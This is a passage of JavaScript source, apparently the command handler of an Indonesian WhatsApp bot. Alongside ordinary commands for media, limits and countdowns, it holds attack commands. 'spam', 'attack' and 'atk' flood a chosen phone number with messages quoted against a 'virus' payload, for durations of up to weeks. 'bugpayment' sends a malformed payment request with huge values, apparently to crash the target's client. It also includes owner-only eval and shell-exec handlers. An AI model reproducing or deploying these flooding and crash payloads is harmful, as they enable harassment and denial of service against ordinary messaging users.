                let rnd =["https://zenzapis.xyz/randomasupan/asupan?apikey=satganzdevs","https://zenzapis.xyz/randomasupan/asupantiktok?apikey=satganzdevs","https://zenzapis.xyz/randomasupan/aeunicetjoaa?apikey=satganzdevs","https://zenzapis.xyz/randomasupan/natajadeh?apikey=satganzdevs","https://zenzapis.xyz/randomasupan/asupantiktok?apikey=satganzdevs"]
         let randvid = rnd[Math.floor(Math.random() * rnd.length)]
            	let buttonMessage = {
                    video: { url: randvid },
                    caption: `Random Asupan`,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 5
                }
                satria.sendMessage(m.chat, buttonMessage, { quoted: fdoc })
                await sleep(99)
                satria.sendMessage(m.chat, { audio: { url : "https://a.uguu.se/YXAzeUvV.mp3"}, mimetype:'audio/mpeg', ptt:true }, {quoted:floc})
            }
            break
            case 'nekopoi':{
         let msgs = global.db.data.database.nekopoi
                satria.copyNForward(m.chat, msgs)
            }
            break
           case 'ceklimit':{
           m.reply(`sisa limit kamu adalah : ${global.db.data.users[m.sender].limit}`)
           }
           break
           case 'cekwarning': case 'cekwarn':{
           m.reply(`jumlah warning kamu adalah : ${global.db.data.users[m.sender].warning}`)
           }
           break
            case 'cekprem': case 'premcek': case 'premiumcek':{
           if (!isPremium && isCreator) throw `Maaf Kamu Belum Terdaftar Di List Premium 🤡`
let anu =`
╭─❒ 「 Premium 」
├ Halo ${pushname}! Kamu Terdaftar di List Premium
╰❒
`
 let btn = [{
                                urlButton: {
                                    displayText: 'Website',
                                    url: global.web
                                }
                            },{
                                quickReplyButton: {
                                    displayText: 'Status Bot',
                                    id: '.ping'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Contact Owner',
                                    id: '.owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'Rent Bots',
                                    id: '.sewa'
                                }
                            }]
satria.send5ButImg(m.chat, anu, global.footer, thumb, btn, { quoted : fliveLoc })
}
break
            case 'mess': case 'c': case 'chat': case 'kirim':{
            	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		db.data.users[m.sender].limit -= 1 // -1 limit
            	if (!text) throw m.reply (`Examples of use : ${command} *>Name of the sender <*|@tag|*>Message<*`)
let bekk = m.sender
let pk = pushname
let bebek = bekk.replace(/[@s.whatsapnet]/g, "").replace(/[@S.WHATSAPNET]/g, "")
let frome = text.split("|")[0]
let orang = text.split("|")[1]
let ortu = orang.replace(/[@]/g, "").replace(/[@]/g, "")
let pesann = text.split("|")[2]
let butt =[{ buttonId: `markread ${pushname}|${bebek}|Congrats \n${pk}/${orang} Read Your Message!!`, buttonText: { displayText: 'Tandai Telah Di Baca' }, type: 1 }]
reply(`Sending Message : ${pesann} To : ${orang} From : ${frome}`)
	await satria.sendButtonText(`${ortu}@s.whatsapp.net`, butt, pesann,`Message From : ${frome}`, m)
}
reply('Success')
break
case 'markread':{
	let frome = text.split("|")[0]
let orang = text.split("|")[1]
let pesann = text.split("|")[2]
let butt =[{ buttonId: 'u', buttonText: { displayText: 'Alhamdulillah' }, type: 1 }]
	await satria.sendButtonText(`${orang}@s.whatsapp.net`, butt, pesann,`Message From : ${frome}`, m)
}
reply('Success')
break
            case 'hitungmundur': case 'countdown': case 'cd':{
            	global.db.data.users[m.sender].limit -= 1
                m.reply("1 limit terpakai")
            if (text.split("|")[1] === "minute") {
            	m.reply(`Countdown Time Has Start`)
                	let time = text.split("|")[0]+"00000"
                	await sleep(time)
                satria.sendMessage(m.chat, {text: `Countdown Time Has Ended `, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://wa.me/6281316701742',
title: '「 ❔ 」',
body: ucapanWaktu,
sourceUrl: `https://${global.web}`, thumbnail: thumb
  }
 }}, { quoted: m })
                } else if (text.split("|")[1] === "second") {
                	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		db.data.users[m.sender].limit -= 1 // -1 limit
                	m.reply(`Countdown Time Has Start`)
                   let time = text.split("|")[0]+"000"
                	await sleep(time)
                satria.sendMessage(m.chat, {text: `Countdown Time Has Ended `, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://wa.me/6281316701742',
title: '「 ❔ 」',
body: ucapanWaktu,
sourceUrl: `https://${global.web}`, thumbnail: thumb
  }
 }}, { quoted: m })
                } else if (text.split("|")[1] === "hours") {
                	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		db.data.users[m.sender].limit -= 1 // -1 limit
                	m.reply(`Countdown Time Has Start`)
                	let time = text.split("|")[0]+"0000000"
                	await sleep(time)
                satria.sendMessage(m.chat, {text: `Countdown Time Has Ended `, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://wa.me/6281316701742',
title: '「 ❔ 」',
body: ucapanWaktu,
sourceUrl: `https://${global.web}`, thumbnail: thumb
  }
 }}, { quoted: m })
                } else {
                 m.reply(`usage example: \n\n countdown 6|second`)
                }
             }
             break
           case 'spam':{
if (!text) throw m.reply(`Examples of use : ${command} *>Message<*|>@Tag<|*>Amount<*`) 
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		db.data.users[m.sender].limit -= 1 // -1 limit
let spar = text.split("|")[0]
let terern = text.split("|")[1]
let ortu = terern.replace(/[@]/g, "").replace(/[@]/g, "")
let jumpeh = text.split("|")[2]
var satgnz = "6281316701742"
let isLinkThisGc = new RegExp(satgnz, 'i')
let isgclink = isLinkThisGc.test(m.text)
 if (isgclink) return m.reply(`You Can't Spam My Owner`)
if (!jumpeh) throw m.reply(`Examples of use : ${command} *>Message<*|>Destination number<|*>Amount<*`)
if (Number(jumpeh) >= 100) throw m.reply('Most!')
if (isNaN(jumpeh)) throw m.reply(`Must be a number `)
for (let i = 0; i < jumpeh; i++){
satria.sendMessage(`${ortu}@s.whatsapp.net`, {text:spar})
}
}
break
break
case 'carbon':{
	if (!text) throw m.reply('Input text')
	global.db.data.users[m.sender].limit -= 1
	m.reply(mess.wait)
	let buttons = [
                    {buttonId: `.igy`, buttonText: {displayText: `Tq Sayang`}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: `https://api-rull.herokuapp.com/api/cmd?code=${q}` },
                    caption: `Nih Coy`,
                    footer: global.footer,
                    buttons: buttons,
                    headerType: 4
                }
                satria.sendMessage(m.chat, buttonMessage, { quoted: fdoc })
            }
	break
	 case 'sewabot': case 'rent': case 'sewa': case 'donate': case 'donation': case 'donasi': case 'donet':{
		let btn = [{
                                urlButton: {
                                    displayText: 'Website',
                                    url: global.web
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Status Bot',
                                    id: 'ping'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Contact Owner',
                                    id: 'owner'
                                }  
                            }]
                            let anu =`${ucapanWaktu}  ${pushname}!\n\nScan This Qr Code For ${command} The Bots🔥`
        let img = { url : 'https://telegra.ph/file/d2cf01e88e3198429df91.jpg' }
	satria.send5ButImg(m.chat, anu, global.footer, img, btn)
	}
	break
	case 'cek':{
		let sections = [{
title: "CHOOSE ONE",
rows: [
{title: "PREMIUM CHECKED", rowId: `.cekprem`, description: `Check Your Status`},
{title: "LIMIT CHECKED", rowId: `.ceklimit`, description: `Check Your Limit Count`},
{title: "WARNING CHECKED", rowId: `.cekwarn`, description: `Check Your Warning Count`}
]
},
]
satria.sendListMsg(m.chat, `Mau Ngecek Apa Kak?`, global.footer, `Hello ${pushname} !`, `Click Here`, sections, m)
}
break
	case 'santed': case 'attack':{
	    if (!isCreator && !isPremium) throw `Premium Only`
	    if (!text) throw `Mau Attack Siapa?`
let nomore = q.replace(/[^0-9]/g, "").replace(/[^0-9]/g, "")
let noget = nomore.replace(/[@s.whatsapnet]/g, "").replace(/[@S.WHATSAPNET]/g, "")
if (isNaN(noget)) throw m.reply(`Must be a number Bitch!! `)
var satgnz = "6281316701742"
let isnoown = new RegExp(satgnz, 'i')
let isOwn = isnoown.test(m.text)
 if (isOwn) return m.reply(`You Can't ${command} My Owner Bitch!`)
 {
 let sections = [
                {
title: "MINUTE SELECTION",
                rows: [
{title: "1 Minute", rowId: `.atk ${noget}|1`, description: `Attack ${noget} During 1 Minute `},
{title: "2 Minute", rowId: `.atk ${noget}|2`, description: `Attack ${noget} During 2 Minute`},
{title: "3 Minute", rowId: `.atk ${noget}|3`, description: `Attack ${noget} During 3 Minute`},
{title: "4 Minute", rowId: `.atk ${noget}|4`, description: `Attack ${noget} During 4 Minute`},
{title: "5 Minute", rowId: `.atk ${noget}|5`, description: `Attack ${noget} During 5 Minute`},
                ]
                },
                {
title: "CLOCK SELECTION",
                rows: [
{title: "1 Hours", rowId: `.atk ${noget}|60`, description: `Attack ${noget} During 1 Hours `},
{title: "2 Hours", rowId: `.atk ${noget}|120`, description: `Attack ${noget} During 2 Hours `},
{title: "3 Hours", rowId: `.atk ${noget}|180`, description: `Attack ${noget} During 3 Hours `},
{title: "4 Hours", rowId: `.atk ${noget}|240`, description: `Attack ${noget} During 4 Hours `},
{title: "5 Hours", rowId: `.atk ${noget}|300`, description: `Attack ${noget} During 5 Hours `}
                ]
                },
                {
title: "DAILY SELECTION",
rows: [
{title: "1 Day", rowId: `.atk ${noget}|1440`, description: `Attack ${noget} During 1 Day `},
{title: "2 Day", rowId: `.atk ${noget}|2880`, description: `Attack ${noget} During 2 Day `},
{title: "3 Day", rowId: `.atk ${noget}|4320`, description: `Attack ${noget} During 3 Day `},
{title: "4 Day", rowId: `.atk ${noget}|5760`, description: `Attack ${noget} During 4 Day `},
{title: "5 Day", rowId: `.atk ${noget}|7200`, description: `Attack ${noget} During 5 Day `}
]
},
{
title: "WEEKLY SELECTION",
rows: [
{title: "1 Week", rowId: `.atk ${noget}|10080`, description: `Attack ${noget} During 1 Week `},
{title: "2 Week", rowId: `.atk ${noget}|20160`, description: `Attack ${noget} During 2 Week `},
{title: "3 Week", rowId: `.atk ${noget}|30240`, description: `Attack ${noget} During 3 Week `},
{title: "4 Week", rowId: `.atk ${noget}|40320`, description: `Attack ${noget} During 4 Week `},
{title: "5 Week", rowId: `.atk ${noget}|50400`, description: `Attack ${noget} During 5 Week `}
]
},
]
satria.sendListMsg(m.chat, ` Select The Attack During`, global.footer, `Hello ${pushname} !`, `Click Here`, sections, m)
}
}
break
case 'atk':{
if (!text) throw m.reply(`Examples of use : ${command} >Target<|*>Amount<*`) 
let spar = text.split("|")[0]
let terern = text.split("|")[1]
var satgnz = "6281316701742"
let isLinkThisGc = new RegExp(satgnz, 'i')
let isgclink = isLinkThisGc.test(m.text)
 if (isgclink) return m.reply(`You Can't Attack My Owner`)
if (!terern) throw m.reply(`Examples of use : ${command} *>Target<*|*>Amount<*`)
for (let i = 0; i < terern; i++){
satria.sendMessage(`${spar}@s.whatsapp.net`, { text: `p`, contextInfo:{"externalAdReply": {"title": ` hehe`,"body": ` hehe`, "previewType": "PHOTO","thumbnailUrl": `https://wa.me/6281316701742`,"thumbnail": thumb,"sourceUrl": "hehe"}}}, { quoted: virus})
}
}
let terern = text.split("|")[1]
reply(`Success Attack Target During Attack ${terern} Minutes`)
break
case 'bugpayment':{
if (!text) throw m.reply(`Examples of use : ${command} >Target<`) 
let nomore = q.replace(/[^0-9]/g, "").replace(/[^0-9]/g, "")
var satgnz = "6281316701742"
let isLinkThisGc = new RegExp(satgnz, 'i')
let isgclink = isLinkThisGc.test(m.text)
 if (isgclink) return m.reply(`You Can't Attack My Owner`)
satria.relayMessage(`${nomore}@s.whatsapp.net`, { requestPaymentMessage: { Message: { TextMessage: { text: "hi", currencyCodeIso4217: 'IDR', requestFrom: '6281316701742@s.whatsapp.net', expiryTimestamp: 6281316701742, amount: 6281316701742, background: thumb }}}}, {})
reply(`Success Send Payment Bug To ${nomore}`)
}
            break
case 'sad':{
let tex = await fetchJson('https://zenzapis.xyz/randomtext/galauquote?apikey=satganzdevs')
let kutu = ['sempurna','1','2','3','4','5','6','7','8','9','10','11','13','14','15','16','17','18','19','20','21','22']
let kuad = kutu[Math.floor(Math.random() * kutu.length)]
let kuadra = fs.readFileSync(`./sound/${kuad}.mp3`)
m.reply(tex.result.message)
satria.sendMessage(m.chat, {audio: kuadra, mimetype:'audio/mpeg', ptt:true, contextInfo: { externalAdReply: { title: ` ${global.botname}`, body: ` Join Bot's Official GC`, previewType: "PHOTO", thumbnailUrl: `https://chat.whatsapp.com/HCqm6RHLxaSBBKbjktvVeC`, thumbnail: thumb, sourceUrl: "https://chat.whatsapp.com/HCqm6RHLxaSBBKbjktvVeC"}}}, { quoted: m})
}
break
default:
if (/^.*(bot|BOT|Bot|bOt|BoT)/.test(m.text)) {
satria.sendMessage(m.chat, {audio: { url : "https://a.uguu.se/neNKFssY.mp3"}, mimetype:'audio/mpeg', ptt:true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  2,
mediaUrl: 'https://wa.me/6281316701742',
title: '「 ❔ 」',
body: ucapanWaktu,
sourceUrl: "https://bit.ly/SatganzDevs", jpegthumbnail: "https://telegra.ph/file/261ccb0b18e76e3b4acdb.jpg"
}
}}, { quoted: m })
}
if (budy.startsWith('.')) {
reply(`Perintah *${command}* Belum Da di Daftar Menu!`)
await sleep(99)
let gomen = fs.readFileSync('./sound/gomen.mp3')
satria.sendMessage(m.chat, {audio: gomen, mimetype:'audio/ogg; codecs=opus', ptt:true, mediaKey: "9D3wGvcENzMp7O/ALiuQobuJL66phQlGpsm/FWiUChs=",contextInfo: { externalAdReply: { title: ` ${global.botname}`, body: ` Join Bot's Official GC`, previewType: "PHOTO", thumbnailUrl: `https://chat.whatsapp.com/HCqm6RHLxaSBBKbjktvVeC`, thumbnail: thumb, sourceUrl: "https://chat.whatsapp.com/HCqm6RHLxaSBBKbjktvVeC"}}}, { quoted: m})
            }
//<---- Didyoumean Versi Ribet ---->//
if (/^own|onwer$/.test(budy?.toLowerCase())) {
let buttons =[{ buttonId: `.owner`, buttonText: { displayText: 'Ya' }, type: 1 }, { buttonId: `.dyms`, buttonText: { displayText: 'Tidak' }, type: 1 }]
satria.sendButtonText(m.chat, buttons, `Mungkin yang kamu maksud adalah *owner*?`, global.footer, m)}

                if (budy.startsWith('=>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                            if (sat == undefined) {
                                bang = util.format(sul)
                            }
                            return m.reply(bang)
                    }
                    try {
                        m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        m.reply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await m.reply(evaled)
                    } catch (err) {
                        await m.reply(String(err))
                    }
                }

                if (budy.startsWith('$')) {
                    if (!isCreator) return m.reply(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if(err) return m.reply(err)
                        if (stdout) return m.reply(stdout)
                    })
                }
			
		if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
                    this.anonymous = this.anonymous ? this.anonymous : {}
                    let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
                    if (room) {
                        if (/^.*(next|leave|start)/.test(m.text)) return
                        if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
                        let other = [room.a, room.b].find(user => user !== m.sender)
                        m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
                            contextInfo: {
                                ...m.msg.contextInfo,
                                forwardingScore: 99999999999999999999,
                                isForwarded: false,
                                participant: other
                            }
                        } : {})
                    }
                    return !0
                }
			
		if (isCmd && budy.toLowerCase() != undefined) {
		    if (m.chat.endsWith('broadcast')) return
		    if (m.isBaileys) return
		    let msgs = global.db.data.database
		    if (!(budy.toLowerCase() in msgs)) return
		    satria.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
		}
        }
        

    } catch (err) {
        m.reply(util.format(err))
    }
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})
